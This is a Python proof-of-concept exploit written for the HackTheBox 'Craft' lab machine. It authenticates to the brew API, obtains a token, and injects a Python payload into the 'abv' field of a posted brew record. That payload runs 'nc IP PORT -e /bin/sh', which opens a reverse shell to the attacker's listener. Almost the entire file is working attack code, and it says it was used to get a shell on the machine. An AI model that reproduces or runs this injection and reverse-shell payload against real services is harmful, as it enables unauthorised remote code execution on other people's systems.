#!/usr/bin/python3
# so this is the POC i userd to get the initial shell in the "crafted" machine in HackTheBox
# change the IP and port as desired.
# make sure you have a listener set befor runing the script
# u need a valid username:password in order to work

import requests
import json
import warnings
import sys
import urllib3
import os

if len(sys.argv) != 6:
    print("[~] Usage :  Setup your listner then:")
    print("./crafted_api.py  ID  IP  PORT USERNAME  PASSWORD")
    exit()

id_str = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
id = int(id_str)

# you can use diffrent payloads, this one work just fine
payload = str("__import__('os').system('nc {} {} -e /bin/sh')".format(ip, port))

# TURN OFF SSL WARNINGS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def request_token():
	global response
	global token
	global headers
	global json_response
	login_response = requests.get('https://api.craft.htb/api/auth/login',  auth=(username, password), verify=False)
	if login_response.status_code == 401:
		print ("[*] Wrong Creeds...")
		exit()
	json_response = json.loads(login_response.text)
	token =  json_response['token']
	headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
print ("[*] Requesting token to post data....")
request_token()
print ("[*] Your token is :")
print ("   " + token)

# MAKING SUR TOKEN IS VALID
print ("[*] Making sur token is valid...")
response_check = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)

# POST BREW DATA
print ("[*] Posting Brew Data...")
brew_dict = {
	"id": id, 
	"brewer" : "m3dsec",
	"name" : "m3dsec",
	"style" : "m3dsec style",
	"abv" : payload
}
json_data = json.dumps(brew_dict)
print ("[*] Injecting The Payload...")
print ("[!] Check out Your listner !")
send_payload = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print ("[!] Happy Hacking..")
